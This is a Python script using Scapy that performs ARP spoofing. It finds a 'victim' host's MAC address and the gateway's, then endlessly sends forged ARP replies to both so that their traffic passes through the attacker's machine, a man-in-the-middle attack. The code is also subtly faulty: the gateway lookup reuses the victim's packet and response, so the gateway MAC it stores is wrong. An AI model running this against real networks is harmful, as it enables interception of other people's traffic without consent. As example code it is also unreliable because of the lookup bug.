# This is a simple arp spoofer to demonstrate, with
# the use of the SCAPY module, how to modify the ARP
# table to impersonate another device on the LAN.
#
from scapy.all import *


###### TARGET STARTS HERE ##########
target_ip = '192.168.75.87' # Enter the IP of your victim/target here

#Constructing the packet to get the MAC address of the victim
arprequest = ARP(pdst=target_ip)
broadcast = Ether(dst='ff:ff:ff:ff:ff:ff') #The ff:ff:ff:ff:ff:ff is the broadcast address, the address where you send your request that will then be sent to every device on the network.

final_packet = broadcast / arprequest

response = srp(final_packet, timeout=2, verbose=True)[0] #Sending message to all device to ask the MAC address

print("")
print(f'THE MAC ADDRESS OF {target_ip}')
mac_target_ip = response[0][1].hwsrc
print(mac_target_ip)

######### TARGET ENDS HERE ##########

########## GATEWAY STARTS HERE ###########

gateway_ip = '192.168.75.182' #Enter IP of your gateway/router here

gateway_arprequest = ARP(pdst=gateway_ip)
broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')

gateway_final_packet = broadcast / gateway_arprequest

gateway_response = srp(final_packet, timeout=2, verbose=True)[0] #

print("")
print(f'THE MAC ADDRESS OF {gateway_ip} (gateway)')
gateway_mac = response[0][1].hwsrc
print(gateway_mac)

######### GATEWAY ENDS HERE ###########

      
print("")
print(f"SENDING NEW IP TO {gateway_ip} TO START SPOOFING")

#The magic of spoofing starts here.      
while True:
    new_packet = ARP(op=2,pdst=target_ip, hwdst=mac_target_ip, psrc=gateway_ip) 
    send(new_packet, verbose=False) #sending packet to victim telling it to replace the gateway IP with ours
    new_packet = ARP(op=2,pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip) 
    send(new_packet, verbose=False) #sending packet to gateway telling it to replace the victim IP with ours


